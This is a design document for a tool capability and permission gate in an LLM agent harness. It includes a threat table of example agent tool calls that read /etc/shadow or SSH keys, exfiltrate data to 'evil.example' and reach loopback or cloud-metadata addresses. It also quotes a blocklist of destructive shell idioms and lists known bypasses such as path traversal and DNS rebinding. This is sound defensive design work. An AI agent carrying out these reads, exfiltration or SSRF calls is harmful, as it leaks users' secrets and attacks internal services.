# Tool Capability / Permission Model — design

**Date:** 2026-06-29
**Status:** design (debt #3 from the architecture-honesty pass) → ready for plan
**Scope of this doc:** the full model + a phased rollout. The v1 minimal slice has its own
implementation plan: `docs/superpowers/plans/2026-06-29-tool-capability-model.md`.

---

## OPEN QUESTIONS (user's call — defaults chosen, flagged here)

1. **Who declares a tool's capabilities — the tool (`describe`) or the operator (manifest / in-code
   table)?** *Recommended default (this doc): a built-in, code-reviewed static table keyed by tool
   name is the authority in v1; `describe` is NOT trusted to grant permission (a compromised tool
   could under-declare to escape the gate).* The manifest supplies the **scopes** (which paths / hosts),
   which is the operator-controlled part. Alternative for v2: a per-`Tool =` block `caps =` override
   (operator-controlled, still trusted) and/or treating `describe` capabilities as an **advisory
   cross-check** that may only *widen* the enforced set, never narrow it. **Decide before v2.**
2. **`net` posture: allowlist or denylist of hosts?** *Recommended default: deny-private
   (loopback + RFC1918 + link-local) hard-veto always; everything else allowed in v1 (SSRF/loopback-agent
   is the concrete threat we must close now).* A positive host allowlist (`net_allow = api.github.com …`,
   default-deny outbound) is a v2 tightening — flagged because it changes the default-allow posture and
   would need per-deployment host lists.
3. **Should `AvoidDestructive` be folded into the capability model or kept as a separate backstop?**
   *Recommended default: keep both* (defense in depth; `capability_policy` registered first so its
   hard-vetoes short-circuit). Folding the destructive-idiom patterns into the capability model is a v2
   cleanup once the capability gate is proven on the live path.

---

## Goal

Replace "blocklist only" with **declared capabilities + scoped allow/deny + confirm-on-escalation**.
Give every tool action a *capability* (does it read files? write files? touch the network? spawn a
process? append to the agent's own memory?), *scope* that capability (which paths / hosts), and have
the helm enforce **default-deny on the dangerous edges** — closing the two open holes (`fs_read` and
`http_fetch` are currently ungated) while keeping the 7 existing tools and 119 tests working.

This is debt **#3** from the 2026-06-29 architecture-honesty pass: *"real tool permission/capability
model (today: destructive-pattern blocklist; fs_read/http_fetch ungated)."*

## The current gap (what exists today)

The **only** safety on a tool call is the `AvoidDestructive` objective
(`src/objective/avoid_destructive.cpp`): it string-matches the serialized `tool + args.dump()` against a
fixed list of destructive shell idioms (`rm -rf`, `mkfs`, `dd if=`, `:(){`, `> /dev/`, `shutdown`,
`reboot`, `chmod -R 000`) and unconditionally confirm-gates `write_file`. It returns a
`VetoResult{vetoed, reason, needs_confirm}` consumed by `Arbiter::dispatch_or_gate`.

Three structural problems:

1. **`fs_read` and `http_fetch` are completely ungated.** `fs_read` will open *any* path the LLM asks
   for — `/etc/shadow`, `~/.ssh/id_rsa`, a `.env`, a key file — and return its contents into the
   conversation. `http_fetch` will GET *any* URL — including an attacker-controlled host (data
   exfiltration of whatever the agent just read) or `http://127.0.0.1:…` / `http://169.254.169.254/…`
   (SSRF against loopback services and cloud metadata). The web UI (`--serve`) made this concrete: a
   CSRF path that drives the loopback agent could chain *"`fs_read` a secret → `http_fetch` it to
   evil.example"* with **zero** policy check. The `X-Hades` CSRF header closed the *driving* vector; it
   does nothing about *what the agent is then allowed to do*.

2. **It is a denylist (enumerate-the-bad).** Anything not on the pattern list is allowed. `dd of=` (no
   `if=`), `truncate`, `find … -delete`, `> importantfile`, a non-`sh` destructive binary — all pass.
   Denylists are inherently incomplete; a security boundary should be an **allowlist** (enumerate-the-good,
   deny the rest).

3. **No notion of capability or scope.** There is no model of *what a tool does* (reads/writes/network/
   exec) or of *bounding* it (which paths, which hosts). Every tool is "fully trusted or pattern-matched."

### Threat scenarios this model must close

| # | Scenario | Today | After v1 |
|---|----------|-------|----------|
| T1 | LLM (or CSRF-driven loopback agent) calls `fs_read {path:"/etc/shadow"}` or a key/secret file | returns contents | **hard veto** (deny-path) |
| T2 | LLM calls `http_fetch {url:"http://evil.example/?d=<exfil>"}` after reading a secret | fetches (exfil) | depends on `net` posture; **confirm/deny** once host allowlist lands (v2); v1 closes the loopback/RFC1918 half |
| T3 | SSRF: `http_fetch {url:"http://127.0.0.1:8080/…"}` or `http://169.254.169.254/…` | fetches loopback/metadata | **hard veto** (private-net) |
| T4 | `fs_read` of a path outside the agent's working area (not explicitly denied) | returns contents | **confirm-gate** (out-of-scope escalation) |
| T5 | A newly added tool with no declared capability | silently allowed | **confirm-gate** (unknown capability) |

## Capability taxonomy

A small, closed set of capabilities — the *kinds of authority* a tool action can exercise:

| Capability | Meaning | v1 outcome baseline |
|---|---|---|
| `FsRead` | reads file/dir contents or metadata | scoped: allow in-scope, deny deny-list, confirm out-of-scope |
| `FsWrite` | creates / overwrites / truncates files | confirm (data loss is escalation); deny deny-list paths |
| `Net` | outbound network egress | deny private (loopback/RFC1918/link-local); allow public (v1); allowlist in v2 |
| `Exec` | spawns a process / runs an arbitrary command | confirm (superset capability — can do any of the above) |
| `MemoryAppend` | append-only writes to the agent's **own** memory files | allow (append-only to files the agent owns; never gated — same decision as today) |
| `Unknown` | tool not in the capability table | confirm (cannot prove safe; escalate to a human) |

**Tool → capability map (the built-in table, v1):**

| Tool | Capability | Scope arg |
|---|---|---|
| `fs_read` | `FsRead` | `args.path` |
| `list_dir` | `FsRead` | `args.path` |
| `write_file` | `FsWrite` | `args.path` |
| `http_fetch` | `Net` | host parsed from `args.url` |
| `shell` | `Exec` | — (whole command) |
| `save_memory` | `MemoryAppend` | — |
| `pin_fact` | `MemoryAppend` | — |

`Exec` is deliberately the **most powerful** capability: a shell can read, write, and reach the network,
so it cannot be safely "scoped" by arg inspection — it is always confirm-gated (matching, and subsuming,
what `AvoidDestructive` does for destructive shell idioms today). The capability of a tool is its
*declared footprint*; a tool may in principle hold more than one capability (a future `git` tool =
`Exec`), in which case the **most restrictive** outcome across its capabilities wins.

### Declaration mechanism — who is trusted to declare (security analysis)

Three options were considered:

- **(a) Self-describe** — extend the existing `describe` JSON so each tool returns its own
  `capabilities`. *Fits the "self-describing tools" design, but is the wrong trust boundary:* the tool
  author (and a compromised/malicious tool binary) would be declaring its own permissions. A tool that
  under-declares (`http_fetch` claiming no `Net`) escapes the gate. **A security model must never let an
  untrusted principal grant itself permission.** Rejected as the *authority*.
- **(b) Manifest `Tool =` block** — operator writes `caps = fs_read` per tool. Operator-controlled
  (trusted), but adds churn to every Tool block and is easy to get wrong/omit (an omitted `caps` would
  have to default to *something*, re-introducing the "undeclared → ?" question). Good for **v2 overrides**.
- **(c) Built-in static table** — a code-reviewed `capability_of(tool_name)` map in the binary. Trusted
  (ships with the binary, can't be altered by a tool), zero manifest churn, covers the 7 bundled tools
  out of the box. The unknown-tool default (`Unknown → confirm`) cleanly handles anything not in the
  table.

**Decision (v1): (c) the static table is the authority for *which* capability a tool has; the manifest
supplies the *scopes* (paths/hosts) via a `capability_policy` Objective block.** This keeps the trusted
authority split correctly: capability *kind* is decided by code review (the table), capability *bounds*
are decided by the operator (the manifest). `describe`-based self-declaration is deferred and, if ever
adopted, may only **widen** the enforced capability set (a cross-check that can add gating, never remove
it), never serve as the grant — see OPEN QUESTION 1.

## Scoping syntax (manifest)

Scopes live in a dedicated **`Objective = capability_policy { … }`** block. It MUST be multi-line — the
manifest parser is one-kv-per-line (a single-line block with two `k = v` pairs mis-parses; documented
gotcha). Each value is a **whitespace-separated list** (the parser trims the whole value after `=`; we
split it on spaces):

```
Objective = capability_policy
{
  fs_read_allow   = ./ ./workspace ./docs       # path PREFIXES fs_read/list_dir may read silently
  fs_read_deny    = /etc /root .env secrets/ .ssh/ .git/credentials   # hard-veto prefixes
  net_deny_hosts  = metadata.google.internal    # extra explicit host denials
  block_private_net = true                       # hard-veto loopback + RFC1918 + link-local (SSRF guard)
  confirm_unscoped  = true                       # out-of-allow-scope read -> confirm (false = hard-veto)
}
```

Semantics:

- **Path matching** is **prefix** matching on the literal `args.path` string (v1 — no symlink/`..`
  canonicalization; see Out of scope). `fs_read_deny` is checked **first** and wins (default-deny edge).
- **Lists are space-separated** within one value (this is the one place whitespace is meaningful and
  intended, unlike the memory-store paths which forbid it).
- **Host matching** for `Net`: the host is parsed from the URL (between `://` and the next `/`, `:`, or
  `?`; userinfo stripped). `block_private_net` hard-vetoes `localhost`, `127.0.0.0/8`, `10.0.0.0/8`,
  `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `0.0.0.0`, and `::1` (string/range checks, v1 —
  no DNS resolution, so a hostname that *resolves* to a private IP is a known v1 gap, see Out of scope).
  `net_deny_hosts` adds explicit substring denials on top.

## Enforcement point

**Decision: a new `CapabilityPolicy` Objective** (`src/objective/capability_policy.cpp`), enforced at the
existing `Arbiter::dispatch_or_gate` seam, reusing the `VetoResult{vetoed, reason, needs_confirm}`
machinery verbatim. Rationale:

- It is the **helm gate** the architecture already has — objectives are consulted in registration order
  before any `TOOL_REQUEST` is posted (`src/arbiter/arbiter.cpp`). No new code path, no new wiring shape.
- It composes with `AvoidDestructive` by **registration order**: `capability_policy` is registered
  **first**, so its hard-vetoes short-circuit before the weaker pattern objective runs, and the first
  objective to demand `needs_confirm` wins (so there is never a double-confirm). `AvoidDestructive`
  **stays** as a defense-in-depth backstop for destructive shell idioms inside an already-permitted
  `Exec` (kept, not folded — see OPEN QUESTION 3).

**Defense in depth (v2, noted not built): also enforce inside `ToolRunner` before subprocess spawn.** The
Objective gate lives in the Arbiter; a second check in `ToolRunner::on_attach` (re-running the same policy
against the `TOOL_REQUEST` it is about to execute) would catch any future code path that posts a
`TOOL_REQUEST` *not* through the Arbiter (e.g. a Bridge module, a settings UI). v1 ships the Objective
only — it covers every path that exists today (all `TOOL_REQUEST`s originate in `dispatch_or_gate`).

## Outcome mapping (reuse `VetoResult`)

| Situation | `VetoResult` | Arbiter effect |
|---|---|---|
| in-scope safe cap (`FsRead` under allow-root; `Net` to public host; `MemoryAppend`) | `{vetoed:false}` | silent allow → `TOOL_REQUEST` |
| escalation: `FsWrite`; `Exec`; `FsRead` out-of-allow-scope (and `confirm_unscoped`); `Unknown` tool | `{vetoed:true, needs_confirm:true, reason:…}` | `CONFIRM_REQUEST` (y/N) |
| denied: `FsRead`/`FsWrite` deny-path; `Net` to private/denied host | `{vetoed:true, needs_confirm:false, reason:…}` | `ASSISTANT_MESSAGE "[blocked: …]"`, action dropped |

## Default policy + backward compatibility

- **`capability_policy` only acts when present** in the manifest's `Objective` blocks. The 119 existing
  tests build agents via the **test overload** of `build_agent` with explicit objective lists that do
  **not** include it → **zero behavior change**, all green. Adding `capability_policy` handling to
  `make_objective` (`app/agent_wiring.cpp`) is purely additive (unknown objective names already return
  `nullptr` / are skipped).
- **`dev.hades` adds the block**, closing the holes on the live path (this is where T1/T3/T4/T5 are shut).
- **Default for an undeclared tool** (not in the static table): **`Unknown → confirm`**. Not hard-deny
  (don't break a freshly added tool), not silent-allow (that's the current hole). A human sees and
  approves the first use of any unrecognized tool.
- **Default for a known tool with no matching scope:** governed by the per-capability baseline in the
  taxonomy table (e.g. `FsRead` out-of-scope → confirm when `confirm_unscoped`, else hard-veto;
  `block_private_net` defaults true).

## Phased rollout

- **v1 (this iteration — the plan doc):** the `CapabilityPolicy` Objective with the built-in tool→capability
  table + path-prefix `fs_read` allow/deny + `Net` private-host hard-veto, wired through `make_objective`,
  added to `dev.hades`. Closes T1, T3, T4, T5 and the SSRF half of T2. Lays the seam for everything else.
- **v2 (follow-ups):** positive `net_allow` host allowlist (default-deny egress — closes T2 fully) ·
  path **canonicalization** (`realpath`, `..`/symlink-safe) · per-`Tool =` block `caps =` operator
  override · `describe` capabilities as an advisory **widen-only** cross-check · `ToolRunner` defense-in-depth
  re-check · fold `AvoidDestructive` patterns into the capability model · per-tool rate/quota limits.

## Testing strategy

- **Unit (v1, primary):** `tests/test_capability_policy.cpp` exercises the objective directly (the same
  shape as `tests/test_objectives.cpp`): in-scope `fs_read` → no veto; deny-path / key-file `fs_read` →
  hard veto (`vetoed && !needs_confirm`); out-of-scope `fs_read` → confirm (`vetoed && needs_confirm`);
  `http_fetch` to `127.0.0.1` / `10.x` / `192.168.x` / `169.254.x` → hard veto; `http_fetch` to a public
  host → no veto; `write_file` → confirm; `shell` → confirm; unknown tool → confirm; `save_memory` /
  `pin_fact` → no veto; non-`ToolCall` action → no veto. Plus `capability_of` table coverage and
  `parse_host` / `is_private_host` helper unit tests.
- **Wiring lock:** `make_objective` builds a `CapabilityPolicy` from a `capability_policy` block; a parse
  of the shipped `dev.hades` yields the objective (regression lock against the one-kv-per-line gotcha).
- **Regression:** full `ctest` stays 119/119 + new tests green — the test-overload agents are unaffected.

## Out of scope (v1)

- **Path canonicalization / symlink + `..` defeat.** v1 prefix-matches the literal `args.path`; a
  `../../etc/shadow` or a symlink into a denied area is **not** caught. Documented limitation; v2 adds
  `realpath`-based canonicalization before matching. (The bundled `fs_read` opens the literal path, so the
  gate and the tool see the same string — but the gate is still string-naive in v1.)
- **DNS-rebinding / hostname→private-IP.** v1 checks the literal host string; a public hostname that
  resolves to a private IP bypasses `block_private_net`. v2 resolves + re-checks (or pushes the check
  into the tool).
- **Positive outbound `net` allowlist** (default-deny egress) — v2 (closes T2 fully).
- **`ToolRunner` second-layer enforcement** — v2 defense in depth.
- **Per-tool quotas / rate limits, capability auditing/provenance** — later.
- **MCP tools** — MCP discovery is already deferred; capability for MCP tools defaults to `Unknown →
  confirm` until MCP tools self-describe and the table/override path is extended.

## MOOS-IvP framing

`capability_policy` is a **standing safety behavior** in the helm — the software analogue of
**`BHV_OpRegion`** (the operating-region / geofence behavior): it does not *drive* the agent, it
*bounds* where the agent may operate. The `fs_read` allow-roots are the operating region on the
filesystem; the `fs_read_deny` paths and `block_private_net` hosts are **keep-out zones** (no-go
polygons) — read `/etc` or reach `127.0.0.1` and the behavior raises a veto, exactly as `OpRegion`
flags a vehicle leaving its survey box. It is **always active** (no run-condition) and competes in the
arbitration alongside the other objectives: `stay_on_budget` (a fuel/endurance limit), `avoid_destructive`
(a collision-avoidance reflex), and now `capability_policy` (the op-region boundary). One agent, several
standing safety behaviors, gated through the one helm — the MOOS-IvP shape the harness is built on.
